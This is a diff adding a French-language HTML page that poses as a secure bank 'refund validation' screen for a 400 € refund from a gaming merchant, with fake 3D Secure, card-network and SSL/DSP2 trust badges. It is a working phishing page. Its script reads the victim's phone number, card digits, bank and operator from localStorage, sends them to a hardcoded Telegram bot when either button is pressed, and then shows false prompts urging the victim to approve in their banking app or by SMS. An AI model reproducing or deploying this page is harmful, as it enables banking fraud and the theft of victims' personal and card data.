@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation de Remboursement | Service Premium</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #0052FF;
+            --primary-light: #4D7CFF;
+            --secondary: #00C6FF;
+            --success: #00D897;
+            --warning: #FF9800;
+            --error: #FF3D57;
+            --dark: #1A1A2E;
+            --light: #F8FAFF;
+            --border-radius: 16px;
+            --shadow: 0 12px 40px rgba(0, 82, 255, 0.15);
+            --transition: all 0.4s cubic-bezier(0.215, 0.61, 0.355, 1);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Montserrat', sans-serif;
+        }
+        
+        body {
+            background-color: var(--light);
+            color: #4A5568;
+            line-height: 1.7;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 45%,
+                rgba(255, 255, 255, 0.2) 50%,
+                rgba(255, 255, 255, 0) 55%
+            );
+            transform: rotate(30deg);
+            animation: shine 4s infinite;
+        }
+        
+        .header h1 {
+            font-size: 1.5rem;
+            margin-bottom: 0.5rem;
+            font-weight: 700;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-weight: 400;
+            font-size: 0.9rem;
+        }
+        
+        .content {
+            padding: 1.5rem;
+        }
+        
+        .alert-box {
+            background-color: rgba(255, 152, 0, 0.1);
+            border-left: 4px solid var(--warning);
+            border-radius: 8px;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .alert-box h2 {
+            color: #E65100;
+            font-size: 1rem;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+        
+        .alert-box p {
+            color: #6B6C7E;
+            font-size: 0.85rem;
+            line-height: 1.5;
+        }
+        
+        .transaction-details {
+            background: var(--light);
+            border-radius: 12px;
+            padding: 1.25rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid rgba(0, 82, 255, 0.1);
+        }
+        
+        .transaction-details h3 {
+            color: var(--dark);
+            font-size: 0.95rem;
+            margin-bottom: 1rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+        
+        .detail-label {
+            color: #718096;
+            font-weight: 500;
+            font-size: 0.85rem;
+        }
+        
+        .detail-value {
+            color: var(--dark);
+            font-weight: 600;
+            font-size: 0.85rem;
+        }
+        
+        .amount {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--primary);
+            text-align: center;
+            margin: 1rem 0;
+            letter-spacing: -1px;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+        
+        .btn {
+            flex: 1;
+            padding: 0.9rem;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: var(--transition);
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--primary-light));
+            color: white;
+            border: none;
+            box-shadow: 0 4px 15px rgba(0, 82, 255, 0.2);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 82, 255, 0.3);
+        }
+        
+        .btn-secondary {
+            background: white;
+            color: var(--primary);
+            border: 1px solid var(--primary);
+        }
+        
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            margin: 1.5rem 0 1rem;
+        }
+        
+        .security-badge {
+            height: 24px;
+            opacity: 0.8;
+            transition: var(--transition);
+        }
+        
+        .footer {
+            text-align: center;
+            color: #A0AEC0;
+            font-size: 0.75rem;
+            margin-top: 1rem;
+            padding-top: 1rem;
+            border-top: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        
+        @media (max-width: 480px) {
+            .action-buttons {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1><i class="fas fa-check-circle"></i> Validation de Remboursement</h1>
+            <p>Finalisez votre demande sécurisée</p>
+        </div>
+        
+        <div class="content">
+            <div class="alert-box">
+                <h2><i class="fas fa-exclamation-circle"></i> Action requise</h2>
+                <p>Merci de valider votre demande via votre application bancaire ou par SMS pour créditer le montant sur votre carte.</p>
+            </div>
+            
+            <div class="transaction-details">
+                <h3><i class="fas fa-receipt"></i> Détails du remboursement</h3>
+                
+                <div class="amount" id="amount-value">400 €</div>
+                
+                <div class="detail-row">
+                    <span class="detail-label">Marchand</span>
+                    <span class="detail-value">Widilo - Instant Gaming</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Opérateur</span>
+                    <span class="detail-value" id="operator-value">Non spécifié</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Banque</span>
+                    <span class="detail-value" id="bank-value">Non spécifiée</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Date</span>
+                    <span class="detail-value" id="transaction-date"></span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Carte</span>
+                    <span class="detail-value" id="card-number">•••• •••• •••• ••••</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Téléphone</span>
+                    <span class="detail-value" id="phone-number">Non renseigné</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Motif</span>
+                    <span class="detail-value" id="reason-value">Non spécifié</span>
+                </div>
+            </div>
+            
+            <div class="action-buttons">
+                <button class="btn btn-primary" onclick="validateByApp()">
+                    <i class="fas fa-mobile-alt"></i> Application
+                </button>
+                <button class="btn btn-secondary" onclick="validateBySMS()">
+                    <i class="fas fa-sms"></i> SMS
+                </button>
+            </div>
+            
+            <div class="security-badges">
+                <img src="https://via.placeholder.com/80x30?text=3D+Secure" alt="3D Secure" class="security-badge">
+                <img src="https://via.placeholder.com/80x30?text=Visa" alt="Visa" class="security-badge">
+                <img src="https://via.placeholder.com/80x30?text=Mastercard" alt="Mastercard" class="security-badge">
+                <img src="https://via.placeholder.com/80x30?text=CB" alt="Carte Bancaire" class="security-badge">
+            </div>
+            
+            <div class="footer">
+                <p><i class="fas fa-lock"></i> Transaction sécurisée SSL 256-bit | Conformité DSP2</p>
+                <p>© 2024 Service Bancaire Sécurisé. Tous droits réservés.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Récupération des données depuis localStorage
+        document.addEventListener('DOMContentLoaded', function() {
+            // Formatage de la date
+            const now = new Date();
+            const options = { 
+                weekday: 'long', 
+                day: 'numeric', 
+                month: 'long', 
+                year: 'numeric',
+                hour: '2-digit', 
+                minute: '2-digit'
+            };
+            document.getElementById('transaction-date').textContent = now.toLocaleDateString('fr-FR', options);
+            
+            // Récupération des données du formulaire
+            const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
+            
+            // Affichage des données
+            if (remboursementData) {
+                document.getElementById('amount-value').textContent = remboursementData.amount + ' €';
+                document.getElementById('card-number').textContent = '•••• •••• •••• ' + (remboursementData.lastFourDigits || '••••');
+                document.getElementById('phone-number').textContent = remboursementData.telephone || 'Non renseigné';
+                document.getElementById('operator-value').textContent = remboursementData.operateur || 'Non spécifié';
+                document.getElementById('bank-value').textContent = remboursementData.bank || 'Non spécifiée';
+                document.getElementById('reason-value').textContent = remboursementData.reason || 'Non spécifié';
+            }
+        });
+        
+        function validateByApp() {
+            const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
+            const message = `🔐 Validation par Application Bancaire 🔐
+📞 Téléphone: ${remboursementData.telephone || 'Non renseigné'}
+💳 Carte: **** **** **** ${remboursementData.lastFourDigits || '••••'}
+💰 Montant: ${remboursementData.amount || '0'} €
+📡 Opérateur: ${remboursementData.operateur || 'Non spécifié'}
+🏦 Banque: ${remboursementData.bank || 'Non spécifiée'}
+📌 Motif: ${remboursementData.reason || 'Non spécifié'}`;
+
+            sendTelegramMessage(message);
+            alert("Merci d'ouvrir votre application bancaire pour finaliser la validation.");
+        }
+        
+        function validateBySMS() {
+            const remboursementData = JSON.parse(localStorage.getItem('remboursementData')) || {};
+            const message = `📱 Validation par SMS 📱
+📞 Téléphone: ${remboursementData.telephone || 'Non renseigné'}
+💳 Carte: **** **** **** ${remboursementData.lastFourDigits || '••••'}
+💰 Montant: ${remboursementData.amount || '0'} €`;
+
+            sendTelegramMessage(message);
+            alert(`Un code de validation a été envoyé au ${remboursementData.telephone || 'numéro enregistré'}.`);
+        }
+        
+        function sendTelegramMessage(message) {
+            const token = "8094841970:AAFFYlK6BoIitk7Dvm091171uV-b6aZSF84";
+            const chatId = "5372119436";
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            }).catch(error => console.error("Erreur d'envoi:", error));
+        }
+    </script>
+</body>
+</html>
